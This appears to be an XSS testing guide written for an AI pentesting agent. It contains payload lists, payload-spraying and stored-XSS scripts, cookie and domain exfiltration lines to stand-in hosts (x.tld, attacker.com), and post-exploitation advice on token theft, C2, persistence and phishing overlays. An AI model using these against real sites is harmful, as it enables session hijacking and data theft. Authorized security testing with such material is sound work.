<xss_vulnerability_guide>
<title>CROSS-SITE SCRIPTING (XSS)</title>

<critical>XSS persists because context, parser, and framework edges are complex. Treat every user-influenced string as untrusted until it is strictly encoded for the exact sink and guarded by runtime policy (CSP/Trusted Types).</critical>

<scope>
- Reflected, stored, and DOM-based XSS across web/mobile/desktop shells
- Multi-context injections: HTML, attribute, URL, JS, CSS, SVG/MathML, Markdown, PDF
- Framework-specific sinks (React/Vue/Angular/Svelte), template engines, and SSR/ISR
- CSP/Trusted Types interactions, bypasses, and gadget-based execution
</scope>

<methodology>
14. Identify sources (URL/query/hash/referrer, postMessage, storage, WebSocket, service worker messages, server JSON) and trace to sinks.
15. Classify sink context: HTML node, attribute, URL, script block, event handler, JavaScript eval-like, CSS, SVG foreignObject.
16. Determine current defenses: output encoding, sanitizer, CSP, Trusted Types, DOMPurify config, framework auto-escaping.
17. Craft minimal payloads per context. **Prioritize console.log() over alert()** for automated verification (e.g., `<script>console.log('XSS_CONFIRMED')</script>`).
</methodology>

<browser_verification>
**CRITICAL: Smart Detection via Console Logs**
Browser-based verification is the most reliable method for XSS. Do NOT rely on screen reading for `alert()` boxes.

1. **Inject Non-Blocking Payloads**:
   Use `console.log('UNIQUE_ID')` instead of `alert()`. Alerts block execution and are hard to detect automation-side.
   - Good: `<img src=x onerror=console.log('XSS_HERE')>`
   - Bad: `<script>alert(1)</script>`

2. **Retrieve Logs**:
   After injection, ALWAYS call:
   `browser_action(action="get_console_logs", tab_id=...)`

3. **Verify Execution**:
   Parse the logs for your unique string. This proves code execution without relying on visual OCR or hanging the browser.
</browser_verification>

<dangerous_functions>
When analyzing source code, look for manual escaping bypasses:

<python>
- Flask/Jinja2: `mark_safe(...)`, `|safe` filter, `Markup(...)`
- Django: `mark_safe(...)`, `format_html(...)` (if used incorrectly)
- Raw HTML generation: `render_template_string(...)` with f-strings
</python>

<java>
- JSP: `<c:out value="${...}" escapeXml="false"/>`
- Spring: `HtmlUtils.htmlUnescape(...)`
- Direct Response Writing: `response.getWriter().write(...)` without escaping
</java>

<go>
- html/template: `template.HTML(...)`, `template.JS(...)` (bypasses auto-escaping)
- `w.Write(...)` with user input directly
- `fmt.Fprintf(w, ...)` with user input
</go>

<javascript_node>
- `dangerouslySetInnerHTML`, `v-html`, `innerHTML`
- `res.send(...)` with unsanitized input
- `eval(...)`, `setTimeout(...)` with user strings
</javascript_node>
</dangerous_functions>

<injection_points>
- Server render: templates (Jinja/EJS/Handlebars), SSR frameworks, email/PDF renderers
- Client render: innerHTML/outerHTML/insertAdjacentHTML, template literals, dangerouslySetInnerHTML, v-html, $sce.trustAsHtml, Svelte {@html}
- URL/DOM: location.hash/search, document.referrer, base href, data-* attributes
- Events/handlers: onerror/onload/onfocus/onclick and JS: URL handlers
- Cross-context: postMessage payloads, WebSocket messages, local/sessionStorage, IndexedDB
- File/metadata: image/SVG/XML names and EXIF, office documents processed server/client
</injection_points>

<context_rules>
- HTML text: encode < > & " '
- Attribute value: encode " ' < > & and ensure attribute quoted; avoid unquoted attributes
- URL/JS URL: encode and validate scheme (allowlist https/mailto/tel); disallow javascript/data
- JS string: escape quotes, backslashes, newlines; prefer JSON.stringify
- CSS: avoid injecting into style; sanitize property names/values; beware url() and expression()
- SVG/MathML: treat as active content; many tags execute via onload or animation events
</context_rules>

<advanced_detection>
<differential_responses>
- Compare responses with/without payload; normalize by length/ETag/digest; observe DOM diffs with MutationObserver
- Time-based userland probes: setTimeout gating to detect execution without visible UI
</differential_responses>

<multi_channel>
- Repeat tests across REST, GraphQL, WebSocket, SSE, Service Workers, and background sync; protections diverge per channel
</multi_channel>
</advanced_detection>

<advanced_techniques>
<dom_xss>
- Sources: location.* (hash/search), document.referrer, postMessage, storage, service worker messages
- Sinks: innerHTML/outerHTML/insertAdjacentHTML, document.write, setAttribute, setTimeout/setInterval with strings, eval/Function, new Worker with blob URLs
- Example vulnerable pattern:
{% raw %}
const q = new URLSearchParams(location.search).get('q');
results.innerHTML = `<li>${q}</li>`;
{% endraw %}
Exploit: {% raw %}?q=<img src=x onerror=fetch('//x.tld/'+document.domain)>{% endraw %}
</dom_xss>

<mutation_xss>
- Leverage parser repairs to morph safe-looking markup into executable code (e.g., noscript, malformed tags)
- Payloads:
{% raw %}<noscript><p title="</noscript><img src=x onerror=alert(1)>
<form><button formaction=javascript:alert(1)>{% endraw %}
</mutation_xss>

<template_injection>
- Server or client templates evaluating expressions (AngularJS legacy, Handlebars helpers, lodash templates)
- Example (AngularJS legacy): {% raw %}{{constructor.constructor('fetch(`//x.tld?c=`+document.cookie)')()}}{% endraw %}
</template_injection>

<csp_bypass>
- Weak policies: missing nonces/hashes, wildcards, data: blob: allowed, inline events allowed
- Script gadgets: JSONP endpoints, libraries exposing function constructors, import maps or modulepreload lax policies
- Base tag injection to retarget relative script URLs; dynamic module import with allowed origins
- Trusted Types gaps: missing policy on custom sinks; third-party introducing createPolicy
</csp_bypass>

<trusted_types>
- If Trusted Types enforced, look for custom policies returning unsanitized strings; abuse policy whitelists
- Identify sinks not covered by Trusted Types (e.g., CSS, URL handlers) and pivot via gadgets
</trusted_types>

<polyglot_minimal>
- Keep a compact set tuned per context:
HTML node: {% raw %}<svg onload=alert(1)>{% endraw %}
Attr quoted: {% raw %}" autofocus onfocus=alert(1) x="{% endraw %}
Attr unquoted: {% raw %}onmouseover=alert(1){% endraw %}
JS string: {% raw %}"-alert(1)-"{% endraw %}
URL: {% raw %}javascript:alert(1){% endraw %}
</polyglot_minimal>
</advanced_techniques>

<frameworks>
<react>
- Primary sink: dangerouslySetInnerHTML; secondary: setting event handlers or URLs from untrusted input
- Bypass patterns: unsanitized HTML through libraries; custom renderers using innerHTML under the hood
- Defense: avoid dangerouslySetInnerHTML; sanitize with strict DOMPurify profile; treat href/src as data, not HTML
</react>

<vue>
- Sink: v-html and dynamic attribute bindings; server-side rendering hydration mismatches
- Defense: avoid v-html with untrusted input; sanitize strictly; ensure hydration does not re-interpret content
</vue>

<angular>
- Legacy expression injection (pre-1.6); $sce trust APIs misused to whitelist attacker content
- Defense: never trustAsHtml for untrusted input; use bypassSecurityTrust only for constants
</angular>

<svelte>
- Sink: {@html} and dynamic attributes
- Defense: never pass untrusted HTML; sanitize or use text nodes
</svelte>

<markdown_richtext>
- Markdown renderers often allow HTML passthrough; plugins may re-enable raw HTML
- Sanitize post-render; forbid inline HTML or restrict to safe whitelist; remove dangerous URI schemes
</markdown_richtext>

<special_contexts>
<emails>
- Most clients strip scripts but allow CSS/remote content; use CSS/URL tricks only if relevant; avoid assuming JS execution
</emails>

<pdf_and_docs>
- PDF engines may execute JS in annotations or links; test javascript: in links and submit actions
</pdf_and_docs>

<file_uploads>
- SVG/HTML uploads served with text/html or image/svg+xml can execute inline; verify content-type and Content-Disposition: attachment
- Mixed MIME and sniffing bypasses; ensure X-Content-Type-Options: nosniff
</file_uploads>
</special_contexts>

<post_exploitation>
- Session/token exfiltration: prefer fetch/XHR over image beacons for reliability; bind unique IDs to correlate victims
- Real-time control: WebSocket C2 that evaluates only a strict command set; avoid eval when demonstrating
- Persistence: service worker registration where allowed; localStorage/script gadget re-injection in single-page apps
- Impact: role hijack, CSRF chaining, internal port scan via fetch, content scraping, credential phishing overlays
</post_exploitation>

<validation>
1. Provide minimal payload and context (sink type) with before/after DOM or network evidence.
2. Demonstrate cross-browser execution where relevant or explain parser-specific behavior.
3. Show bypass of stated defenses (sanitizer settings, CSP/Trusted Types) with proof.
4. Quantify impact beyond alert: data accessed, action performed, persistence achieved.
</validation>

<false_positives>
- Reflected content safely encoded in the exact context
- CSP with nonces/hashes and no inline/event handlers; Trusted Types enforced on sinks; DOMPurify in strict mode with URI allowlists
- Scriptable contexts disabled (no HTML pass-through, safe URL schemes enforced)
</false_positives>

<automation_patterns>
<title>AUTOMATED XSS DETECTION AND EXPLOITATION</title>

<critical>XSS testing requires context-aware automation. Manual browser clicking misses DOM XSS, CSP bypasses, and framework-specific sinks.</critical>

<payload_spraying>
**Automated Payload Testing with Python:**

```python
# Use python tool for XSS payload spraying
import requests
from urllib.parse import quote
import re

def generate_context_payloads():
    """Generate payloads for different contexts."""
    return {
        "html_node": [
            "<svg onload=alert(1)>",
            "<img src=x onerror=alert(1)>",
            "<script>alert(1)</script>",
            "<iframe src=javascript:alert(1)>"
        ],
        "attribute_quoted": [
            "\" autofocus onfocus=alert(1) x=\"",
            "' autofocus onfocus=alert(1) x='",
            "\" onmouseover=alert(1) x=\""
        ],
        "attribute_unquoted": [
            "onmouseover=alert(1)",
            "onfocus=alert(1) autofocus"
        ],
        "javascript_string": [
            "'-alert(1)-'",
            "\"-alert(1)-\"",
            "';alert(1);//"
        ],
        "url_context": [
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>"
        ]
    }

def test_xss_reflection(target_url, param_name="q"):
    """Test for reflected XSS."""
    payloads = generate_context_payloads()
    findings = []
    
    for context, payload_list in payloads.items():
        print(f"[*] Testing {context} context...")
        
        for payload in payload_list:
            try:
                resp = requests.get(
                    target_url,
                    params={param_name: payload},
                    timeout=5
                )
                
                # Check if payload is reflected unencoded
                if payload in resp.text:
                    print(f"[!] Reflected (unencoded): {payload[:50]}")
                    findings.append({
                        "context": context,
                        "payload": payload,
                        "reflected": True,
                        "encoded": False
                    })
                # Check for HTML-encoded reflection
                elif quote(payload) in resp.text or payload.replace("<", "&lt;") in resp.text:
                    print(f"[~] Reflected (encoded): {payload[:50]}")
                    
            except Exception as e:
                pass
    
    return findings

# Execute
findings = test_xss_reflection("https://target.com/search", "q")
print(f"\n[*] Found {len(findings)} potential XSS points")
```
</payload_spraying>

<dom_xss_automation>
**DOM XSS Testing with Browser Automation:**

```python
# Use browser_action tool for DOM XSS
# Step 1: Launch browser
browser_action(action="launch", url="https://target.com")

# Step 2: Test DOM XSS payloads with console.log
dom_payloads = [
    "#<img src=x onerror=console.log('XSS_CONFIRMED_IMG')>",
    "?q=<svg onload=console.log('XSS_CONFIRMED_SVG')>",
    "#q='-console.log('XSS_CONFIRMED_JS')-'"
]

for payload in dom_payloads:
    print(f"[*] Testing payload: {payload}")
    browser_action(action="goto", url=f"https://target.com{payload}")
    browser_action(action="wait", duration=2.0)
    
    # Step 3: Check console logs for confirmation
    logs_result = browser_action(action="get_console_logs")
    logs = logs_result.get('logs', [])
    
    # Flatten logs if needed or check directly
    log_text = str(logs)
    
    if "XSS_CONFIRMED" in log_text:
        print(f"[!] DOM XSS CONFIRMED via Console: {payload}")
        print(f"    Log Evidence: {logs}")
```

**Python + Playwright for Advanced DOM XSS:**
```python
# Use python tool with playwright
from playwright.sync_api import sync_playwright

def test_dom_xss(target_url):
    """Test DOM XSS with full browser automation."""
    xss_detected = []
    
    with sync_playwright() as p:
        browser = p.chromium.launch()
        page = browser.new_page()
        
        # Setup alert handler
        def handle_dialog(dialog):
            print(f"[!] XSS ALERT: {dialog.message}")
            xss_detected.append(dialog.message)
            dialog.dismiss()
        
        page.on("dialog", handle_dialog)
        
        # Test payloads
        payloads = [
            "#<img src=x onerror=alert('xss1')>",
            "?search=<svg onload=alert('xss2')>",
            "#q='-alert('xss3')-'"
        ]
        
        for payload in payloads:
            try:
                page.goto(f"{target_url}{payload}", wait_until="networkidle")
                page.wait_for_timeout(2000)
            except Exception as e:
                print(f"[-] Error with {payload}: {e}")
        
        browser.close()
    
    return xss_detected

# Execute
xss_found = test_dom_xss("https://target.com")
print(f"[*] Detected {len(xss_found)} XSS instances")
```
</dom_xss_automation>

<csp_bypass_automation>
**Automated CSP Bypass Testing:**

```python
# Use python tool to test CSP bypasses
import requests
import re

def analyze_csp(target_url):
    """Extract and analyze CSP policy."""
    resp = requests.get(target_url)
    csp_header = resp.headers.get('Content-Security-Policy', '')
    
    if not csp_header:
        print("[!] No CSP detected - XSS likely exploitable")
        return None
    
    print(f"[*] CSP Policy: {csp_header}")
    
    # Check for weak directives
    weaknesses = []
    
    if "'unsafe-inline'" in csp_header:
        weaknesses.append("unsafe-inline allowed")
    
    if "'unsafe-eval'" in csp_header:
        weaknesses.append("unsafe-eval allowed")
    
    if "data:" in csp_header:
        weaknesses.append("data: URIs allowed")
    
    if "*" in csp_header or "https:" in csp_header:
        weaknesses.append("Wildcard or broad allowlist")
    
    # Check for JSONP endpoints (script-src)
    script_src = re.search(r'script-src ([^;]+)', csp_header)
    if script_src:
        domains = script_src.group(1).split()
        print(f"[*] script-src domains: {domains}")
        # Test for JSONP on allowed domains
        for domain in domains:
            if domain.startswith('http'):
                test_jsonp_bypass(domain)
    
    if weaknesses:
        print(f"[!] CSP Weaknesses: {', '.join(weaknesses)}")
    
    return csp_header

def test_jsonp_bypass(domain):
    """Test for JSONP endpoints that can bypass CSP."""
    jsonp_paths = [
        "/api/jsonp?callback=",
        "/search?callback=",
        "/api/v1/data?callback="
    ]
    
    for path in jsonp_paths:
        try:
            url = f"{domain}{path}alert"
            resp = requests.get(url, timeout=3)
            if "alert(" in resp.text:
                print(f"[!] JSONP bypass found: {url}")
        except:
            pass

# Execute CSP analysis
analyze_csp("https://target.com")
```

**Testing Base Tag Injection:**
```python
# Use python tool to test base tag CSP bypass
def test_base_tag_injection(target_url, param="q"):
    """Test if base tag can be injected to bypass CSP."""
    payload = '<base href="https://attacker.com/">'
    
    resp = requests.get(target_url, params={param: payload})
    
    if payload in resp.text or '<base href=' in resp.text:
        print("[!] Base tag injection possible")
        print("[*] This can redirect relative script URLs to attacker domain")
        return True
    
    return False

test_base_tag_injection("https://target.com/search")
```
</csp_bypass_automation>

<stored_xss_testing>
**Automated Stored XSS Testing:**

```python
# Use python tool for stored XSS
import requests
import uuid

def test_stored_xss(create_url, view_url, payload_field="comment"):
    """Test for stored XSS."""
    
    # Generate unique marker
    marker = str(uuid.uuid4())[:8]
    payload = f"<img src=x onerror=alert('{marker}')>"
    
    # Step 1: Create entry with XSS payload
    print(f"[*] Creating entry with marker: {marker}")
    create_resp = requests.post(
        create_url,
        json={payload_field: payload},
        headers={"Content-Type": "application/json"}
    )
    
    if create_resp.status_code not in [200, 201]:
        print(f"[-] Failed to create entry: {create_resp.status_code}")
        return False
    
    entry_id = create_resp.json().get('id')
    
    # Step 2: Retrieve and check for unencoded payload
    print(f"[*] Retrieving entry {entry_id}...")
    view_resp = requests.get(f"{view_url}/{entry_id}")
    
    if payload in view_resp.text:
        print(f"[!] STORED XSS CONFIRMED: Payload reflected unencoded")
        print(f"    Marker: {marker}")
        return True
    elif marker in view_resp.text:
        print(f"[~] Payload stored but may be encoded")
        return False
    
    return False

# Execute
test_stored_xss(
    "https://target.com/api/comments",
    "https://target.com/comments",
    "comment"
)
```
</stored_xss_testing>

<tool_selection>
**When to use each tool:**

1. **python tool** (PRIMARY for XSS):
   - Payload spraying and reflection testing
   - CSP analysis and bypass testing
   - Stored XSS creation and verification
   - Playwright/Selenium for complex DOM XSS

2. **browser_action tool**:
   - DOM instrumentation and sink tracking
   - Testing XSS in complex UI workflows
   - Visual confirmation of XSS execution
   - Testing framework-specific sinks (React, Vue, Angular)

3. **terminal tool**:
   - Running specialized XSS scanners (dalfox, xsstrike)
   - Quick curl-based reflection tests

4. **web_search tool**:
   - Finding latest CSP bypass techniques
   - Researching framework-specific XSS vectors
   - Discovering new payload encodings
</tool_selection>
</automation_patterns>

<pro_tips>
1. Start with context classification, not payload brute force.
2. Use DOM instrumentation to log sink usage; it reveals unexpected flows.
3. Keep a small, curated payload set per context and iterate with encodings.
4. Validate defenses by configuration inspection and negative tests.
5. Prefer impact-driven PoCs (exfiltration, CSRF chain) over alert boxes.
6. Treat SVG/MathML as first-class active content; test separately.
7. Re-run tests under different transports and render paths (SSR vs CSR vs hydration).
8. Test CSP/Trusted Types as features: attempt to violate policy and record the violation reports.
</pro_tips>

<remember>Context + sink decide execution. Encode for the exact context, verify at runtime with CSP/Trusted Types, and validate every alternative render path. Small payloads with strong evidence beat payload catalogs.</remember>
</xss_vulnerability_guide>
